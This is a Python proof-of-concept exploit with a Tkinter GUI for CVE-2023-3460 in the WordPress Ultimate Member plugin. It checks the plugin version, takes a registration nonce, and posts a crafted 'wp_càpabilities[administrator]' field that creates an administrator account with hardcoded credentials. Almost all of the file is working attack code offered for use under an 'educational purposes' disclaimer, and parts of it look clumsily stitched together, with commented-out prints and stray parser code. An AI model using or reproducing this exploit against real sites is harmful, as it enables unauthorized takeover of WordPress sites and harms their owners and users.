# CVE-2023-3460
# Ultimate Member Unauthorized Administrator Access Exploit 
# by Secragon
# PoC for educational/research purposes only
# Use it at your own risk!

import re
import sys
import urllib3
import requests
import argparse
from colorama import Fore, Style

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
import tkinter
from tkinter import *
import tkinter as tk
from tkinter.ttk import *
from time import strftime
from tkinter import ttk
def Unauthorized():
    root = tkinter.Tk()
    root.title("CVE-2023-3460 exploits")
    root.geometry('800x600+0+0')
    def printInput():
        inp = inputtxt.get(1.0, "end-1c")
        lbl.config(text = "attack url : "+inp)
        target = inp
        username = "secragon"
        password = "OffensiveSecurity123"
        email = "exploit@secragon.com"
        def check_version(target):
            scroll_y = Scrollbar(root, orient=VERTICAL)
            txtarea = Text(root, yscrollcommand=scroll_y.set, font=("times new roman", 15, "bold"), fg="#3206b8")
            scroll_y.pack(side=RIGHT, fill=Y)
            scroll_y.config(command=txtarea.yview)
            txtarea.insert(END, "Site version:")
            txtarea.pack(fill=BOTH, expand=True)
            txtarea.configure(state ='disabled')
           # print(Style.RESET_ALL + "Site version:", end=' ')
            try:
                r = requests.get(f"{target}/wp-content/plugins/ultimate-member/readme.txt", verify=False)
                version = re.search(r"Stable tag: (.*)", r.text).groups()[0]

            except:
                txtarea.insert(END, "error...")
                #print(Fore.RED + f'error...')
               # exit()


            if int(version.replace('.','')) < 267:
                txtarea.insert(END, f'{version} - vulnerable!')
                #print(Fore.GREEN + f'{version} - vulnerable!')
            else:
                txtarea.insert(END, f'{version} - not vulnerable!')
               # print(Fore.RED + f'{version} - not vulnerable!')
                #exit()

        def add_admin(target, form_id):

            headers = {
                'User-Agent': 'Secragon Offensive Agent'
            }
            scroll_y = Scrollbar(root, orient=VERTICAL)
            txtarea = Text(root, yscrollcommand=scroll_y.set, font=("times new roman", 15, "bold"), fg="#3206b8")
            scroll_y.pack(side=RIGHT, fill=Y)
            scroll_y.config(command=txtarea.yview)
            txtarea.insert(END, "Getting nonce:")
            txtarea.pack(fill=BOTH, expand=True)
            txtarea.configure(state ='disabled')
            #print(Style.RESET_ALL + "Getting nonce:", end =' ')

            s = requests.Session()
            try:
                r = s.get(f'{target}/index.php/register/', headers=headers, verify=False)
                nonce = re.search(r"name=\"_wpnonce\" value=\"(.{10})\"", r.text).groups()[0]
               # print(Fore.GREEN + f"{nonce}")
                txtarea.insert(END, f"{nonce}")

            except:
                txtarea.insert(END, 'error...')
               # print(Fore.RED + f'error...')
               # exit()


            data = {
                f'user_login-{form_id}' : username,
                f'user_email-{form_id}': email,
                f'user_password-{form_id}': password,
                f'confirm_user_password-{form_id}': password,
                f'first_name-{form_id}': 'Exploit',
                f'last_name-{form_id}': 'bySecragon',
                'form_id': form_id,
                'um_request': '',
                '_wpnonce': nonce,
                'wp_càpabilities[administrator]': 1
            }
            txtarea.insert(END, "Adding a new admin:\n")
            #print(Style.RESET_ALL + "Adding a new admin:", end =' ')


            r = s.post(f'{target}/index.php/register/', data=data, headers=headers, verify=False)
            if r.history[0].status_code == 302:
                txtarea.insert(END, 'done')
               # print(Fore.GREEN + f'done')
            else:
                txtarea.insert(END, 'error...')
                #print(Fore.RED + f'error...')
                #exit()

            txtarea.insert(END, "All set! You can now login using the following credentials:\n")
            txtarea.insert(END, f'\nUsername: {username}')
            txtarea.insert(END, f'\nPassword: {password}')
           # print(Style.RESET_ALL + "All set! You can now login using the following credentials:")
           # print(f'Username: {username}')
           # print(f'Password: {password}')
        '''
        scroll_y = Scrollbar(root, orient=VERTICAL)
        txtarea = Text(root, yscrollcommand=scroll_y.set, font=("times new roman", 15, "bold"), fg="#3206b8")
        scroll_y.pack(side=RIGHT, fill=Y)
        scroll_y.config(command=txtarea.yview)
        txtarea.insert(END, "\n --- Ultimate Member exploit ---")
        txtarea.insert(END, "\n (unauthorized admin access)")
        txtarea.insert(END, "\nby gbrsh@secragon")
        txtarea.pack(fill=BOTH, expand=True)
        txtarea.configure(state ='disabled')
        '''
       # print(Fore.BLUE + "\t\t --- Ultimate Member exploit ---")
       # print("\t\t   (unauthorized admin access)")
        #print(Fore.RED + "\t\t\t\t\tby gbrsh@secragon")
        #print(Style.RESET_ALL)

        '''
parser = argparse.ArgumentParser()

parser.add_argument('url', help='http://wphost')

if len(sys.argv) == 1:
    parser.print_help()
    print()
    exit()

        args = parser.parse_args()
        '''
        check_version(target)
        add_admin(target, 6)

    Hacher = Label(root, text="Enter url or domin https://www.example.com/api/v3 : ").pack()
    inputtxt = tk.Text(root,height = 1,width = 80)
    inputtxt.pack()
    printButton = tk.Button(root,text = "exploit", command = printInput)
    printButton.pack()
    lbl = tk.Label(root, text = "")
    lbl.pack()
    root.mainloop()
